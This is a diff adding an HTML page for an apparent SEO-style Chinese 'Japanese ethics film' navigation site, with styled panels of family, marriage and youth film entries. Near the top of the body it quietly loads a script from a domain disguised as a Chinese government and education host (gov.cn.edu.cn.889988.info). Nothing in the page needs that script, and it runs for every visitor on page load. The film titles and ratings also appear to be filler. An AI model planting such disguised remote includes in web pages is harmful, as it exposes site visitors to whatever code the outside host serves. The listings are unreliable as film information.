@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>日本伦理电影网 - 日本伦理片/家庭羁绊/婚姻生活在线导航</title>
+<meta name="description" content="日本伦理电影网(ribenlunlidianyingwang-h5.github.io)整理日本伦理电影片单，涵盖家庭羁绊、婚姻生活、青春物语等方向，单页自适应，免费影视导航。">
+<meta name="keywords" content="日本伦理电影网,日本伦理电影,家庭伦理片,婚姻伦理,青春伦理,日式文艺片">
+<meta name="author" content="日本伦理电影网">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="日本伦理电影网 - 日本伦理片在线导航">
+<meta property="og:description" content="日本伦理电影网整理家庭羁绊、婚姻生活、青春物语等日本伦理片片单。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://ribenlunlidianyingwang-h5.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{font-size:16px;scroll-behavior:smooth}
+body{
+  font-family:"Hiragino Mincho ProN","Noto Serif SC","Songti SC",serif;
+  background:#f2efe9;color:#2e2a26;line-height:1.8;
+}
+a{text-decoration:none;color:inherit}
+ul{list-style:none}
+
+/* 布局 */
+.frame{display:flex;min-height:100vh}
+/* 左侧竖排 */
+.vertical-menu{
+  width:76px;background:#1f3a44;display:flex;flex-direction:column;
+  align-items:center;padding:1rem 0;gap:.4rem;position:sticky;top:0;height:100vh;
+}
+.vertical-menu .logo{
+  writing-mode:vertical-rl;font-size:1rem;font-weight:900;color:#e8d9b5;
+  letter-spacing:2px;margin-bottom:1rem;height:150px;
+}
+.vertical-menu .logo b{color:#7fb3a3}
+.vertical-menu .vm-btn{
+  writing-mode:vertical-rl;transform:rotate(180deg);
+  font-size:.78rem;padding:.7rem .35rem;border-radius:6px;cursor:pointer;
+  color:#c3d4d0;border:1px solid transparent;transition:.25s;letter-spacing:1px;
+}
+.vertical-menu .vm-btn.active,.vertical-menu .vm-btn:hover{
+  background:#2f5660;color:#e8d9b5;border-color:#7fb3a3;
+}
+.content{flex:1;padding:1rem;max-width:1000px;margin:0 auto}
+
+/* 面板 */
+.panel{display:none;animation:washi .45s ease}
+.panel.active{display:block}
+@keyframes washi{from{opacity:0;filter:blur(2px)}to{opacity:1;filter:none}}
+
+/* 通用标题 */
+.kicker{font-size:.72rem;letter-spacing:3px;color:#7a6a55;margin-bottom:.3rem}
+h1.page-h,h2.page-h{
+  font-size:1.6rem;color:#1f3a44;margin-bottom:.6rem;font-weight:900;
+}
+h1.page-h span,h2.page-h span{color:#a45c40}
+.sub{font-size:.86rem;color:#6b5d4a;margin-bottom:1rem}
+
+/* 首页 */
+.hero-paper{
+  background:#faf7f2;border:1px solid #ded6c8;border-radius:4px;padding:1.6rem;
+  box-shadow:0 2px 0 #e6dfd2;
+}
+.haiku{
+  margin-top:1rem;padding:1rem;background:#f0ede6;border-left:3px solid #a45c40;
+  font-size:.9rem;color:#5a4a3a;font-style:italic;
+}
+.cat-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:.7rem;margin-top:1rem}
+.cat-grid .cg{background:#faf7f2;border:1px solid #ded6c8;padding:.9rem;border-radius:4px}
+.cat-grid .cg h3{font-size:.9rem;color:#1f3a44;margin-bottom:.2rem}
+.cat-grid .cg p{font-size:.74rem;color:#7a6a55}
+
+/* 片单 */
+.film-list{display:flex;flex-direction:column;gap:.8rem}
+.film-row{
+  display:flex;gap:.9rem;background:#faf7f2;border:1px solid #ded6c8;
+  border-radius:4px;padding:.8rem;transition:.25s;
+}
+.film-row:hover{box-shadow:0 4px 14px rgba(31,58,68,.1)}
+.film-row .thumb{
+  width:96px;height:120px;flex-shrink:0;border-radius:3px;
+  background:linear-gradient(160deg,#7fb3a3,#3e6b6f);
+  display:flex;align-items:center;justify-content:center;color:#f2efe9;font-size:.72rem;font-weight:700;
+}
+.film-row .desc h3{font-size:.95rem;color:#1f3a44;margin-bottom:.2rem}
+.film-row .desc .reason{font-size:.78rem;color:#5a4a3a;margin-bottom:.3rem}
+.film-row .desc .tags{font-size:.68rem;color:#9a8a72}
+
+/* 青春物语 */
+.note-card{
+  background:#faf7f2;border:1px dashed #a45c40;border-radius:4px;padding:1.1rem;margin-bottom:.8rem;
+}
+.note-card h3{color:#a45c40;font-size:1rem;margin-bottom:.4rem}
+.note-card p{font-size:.82rem;color:#5a4a3a}
+.note-card .dir{margin-top:.5rem;font-size:.72rem;color:#8a7a62;text-align:right}
+
+/* 关于 */
+.about-washi{
+  background:#faf7f2;border:1px solid #a45c40;border-radius:4px;padding:1.5rem;
+}
+.about-washi p{font-size:.85rem;color:#5a4a3a;margin-bottom:.6rem}
+.about-washi .info{
+  margin-top:1rem;background:#f0ede6;border:1px dashed #1f3a44;border-radius:4px;padding:1rem;
+}
+.about-washi .info h3{color:#1f3a44;margin-bottom:.4rem}
+.about-washi .info p{font-size:.78rem;color:#6b5d4a}
+
+.foot{
+  text-align:center;padding:1.4rem 1rem;border-top:1px solid #ded6c8;margin-top:1.6rem;
+  font-size:.72rem;color:#8a7a62;
+}
+
+@media(max-width:768px){
+  .frame{flex-direction:row}
+  .vertical-menu{width:56px;padding:.6rem 0}
+  .vertical-menu .logo{font-size:.8rem;height:100px}
+  .vertical-menu .vm-btn{font-size:.68rem;padding:.5rem .25rem}
+  .cat-grid{grid-template-columns:1fr}
+  .film-row{flex-direction:column}
+  .film-row .thumb{width:100%;height:90px}
+  h1.page-h,h2.page-h{font-size:1.3rem}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+<div class="frame">
+  <aside class="vertical-menu">
+    <div class="logo">日本<b>伦理</b>电影网</div>
+    <a href="#" class="vm-btn active" data-panel="home">首页</a>
+    <a href="#" class="vm-btn" data-panel="family">家庭羁绊</a>
+    <a href="#" class="vm-btn" data-panel="marriage">婚姻生活</a>
+    <a href="#" class="vm-btn" data-panel="youth">青春物语</a>
+    <a href="#" class="vm-btn" data-panel="about">关于本站</a>
+  </aside>
+
+  <main class="content">
+
+    <!-- 首页 -->
+    <section id="home" class="panel active">
+      <div class="kicker">JAPANESE ETHICAL CINEMA</div>
+      <h1 class="page-h">日本<span>伦理电影</span>网</h1>
+      <p class="sub">用一顿饭、一场葬礼、一张返程车票，讲完一整个家。</p>
+      <div class="hero-paper">
+        <div class="haiku">“在日本伦理片里，最重的那句话，通常没人说出来。”</div>
+        <div class="cat-grid">
+          <div class="cg"><h3>家庭羁绊</h3><p>饭桌、遗产、回家的路</p></div>
+          <div class="cg"><h3>婚姻生活</h3><p>两个人的沉默与账单</p></div>
+          <div class="cg"><h3>青春物语</h3><p>告白之前的那个夏天</p></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 家庭羁绊 -->
+    <section id="family" class="panel">
+      <div class="kicker">FAMILY</div>
+      <h2 class="page-h">家庭<span>羁绊</span></h2>
+      <p class="sub">代际、遗产、离散——日本家庭伦理最擅长的事。</p>
+      <div class="film-list">
+        <div class="film-row">
+          <div class="thumb">家族</div>
+          <div class="desc"><h3>最后的家宴</h3><p class="reason">母亲走后，三兄妹第一次认真做一顿饭。</p><span class="tags">家庭伦理 · 2023 · 8.5</span></div>
+        </div>
+        <div class="film-row">
+          <div class="thumb">父子</div>
+          <div class="desc"><h3>父亲的返程票</h3><p class="reason">一张没被使用的车票，串起三十年父子关系。</p><span class="tags">代际伦理 · 2022 · 8.2</span></div>
+        </div>
+        <div class="film-row">
+          <div class="thumb">遗产</div>
+          <div class="desc"><h3>两栋老房子</h3><p class="reason">姐姐要留，弟弟要卖，母亲把钥匙藏在饭盒里。</p><span class="tags">遗产伦理 · 2024 · 8.4</span></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 婚姻生活 -->
+    <section id="marriage" class="panel">
+      <div class="kicker">MARRIAGE</div>
+      <h2 class="page-h">婚姻<span>生活</span></h2>
+      <p class="sub">不是不爱了，是不知道该怎么再开口。</p>
+      <div class="film-list">
+        <div class="film-row">
+          <div class="thumb">中年</div>
+          <div class="desc"><h3>第二十年的菜单</h3><p class="reason">结婚纪念日那天，他们决定重新认识对方。</p><span class="tags">婚姻伦理 · 2023 · 8.3</span></div>
+        </div>
+        <div class="film-row">
+          <div class="thumb">距离</div>
+          <div class="desc"><h3>两地书</h3><p class="reason">丈夫调职北海道，信件比人更早抵达。</p><span class="tags">异地伦理 · 2021 · 7.9</span></div>
+        </div>
+        <div class="film-row">
+          <div class="thumb">告别</div>
+          <div class="desc"><h3>安静的告别</h3><p class="reason">离婚登记前，他们一起打扫了最后一间房。</p><span class="tags">离婚伦理 · 2024 · 8.6</span></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 青春物语 -->
+    <section id="youth" class="panel">
+      <div class="kicker">YOUTH</div>
+      <h2 class="page-h">青春<span>物语</span></h2>
+      <p class="sub">青春期最重要的伦理课，是学会说不、也学会告别。</p>
+      <div class="note-card">
+        <h3>海边的选择</h3>
+        <p>暑假最后一天，她终于把写好的信折成了纸船。</p>
+        <div class="dir">— 导演手记：有些话不必抵达</div>
+      </div>
+      <div class="note-card">
+        <h3>放学后的便利店</h3>
+        <p>三个人、一盒饭团、一段没敢说出口的喜欢。</p>
+        <div class="dir">— 导演手记：青春戏要在留白里拍</div>
+      </div>
+      <div class="note-card">
+        <h3>十七岁的返信</h3>
+        <p>他等了三个月，回信只有一张毕业照。</p>
+        <div class="dir">— 导演手记：遗憾本身就是答案</div>
+      </div>
+    </section>
+
+    <!-- 关于 -->
+    <section id="about" class="panel">
+      <div class="kicker">ABOUT</div>
+      <h2 class="page-h">关于<span>本站</span></h2>
+      <div class="about-washi">
+        <p>日本伦理电影网是一个“片单与分类导航”站点，专注整理日本伦理电影，涵盖家庭羁绊、婚姻生活、青春物语等方向。</p>
+        <p>页面采用单文件 H5 结构，CSS/JS 全部内联，手机、平板、电脑一套代码自适应；核心标题与正文直接写在 HTML 里，方便搜索引擎收录。</p>
+        <p>本站不提供盗版下载，也不生成 robots.txt / sitemap.xml，仅作影视信息展示与站内分类导航。</p>
+        <div class="info">
+          <h3>站点信息</h3>
+          <p>网站名称：日本伦理电影网</p>
+          <p>网址：https://ribenlunlidianyingwang-h5.github.io</p>
+          <p>关键词：日本伦理电影网、日本伦理电影、家庭伦理片、婚姻伦理、青春伦理</p>
+        </div>
+      </div>
+    </section>
+
+    <footer class="foot">
+      <p>© 2024 日本伦理电影网 | https://ribenlunlidianyingwang-h5.github.io</p>
+      <p>本网站仅提供影视信息展示与分类导航，所有资源来自互联网，如有侵权请联系删除。</p>
+    </footer>
+  </main>
+</div>
+
+<script>
+document.querySelectorAll('.vm-btn').forEach(function(btn){
+  btn.addEventListener('click',function(e){
+    e.preventDefault();
+    var p=this.dataset.panel;
+    document.querySelectorAll('.panel').forEach(function(x){x.classList.remove('active')});
+    document.getElementById(p).classList.add('active');
+    document.querySelectorAll('.vm-btn').forEach(function(x){x.classList.remove('active')});
+    this.classList.add('active');
+    window.scrollTo({top:0,behavior:'smooth'});
+  });
+});
+</script>
+</body>
+</html>
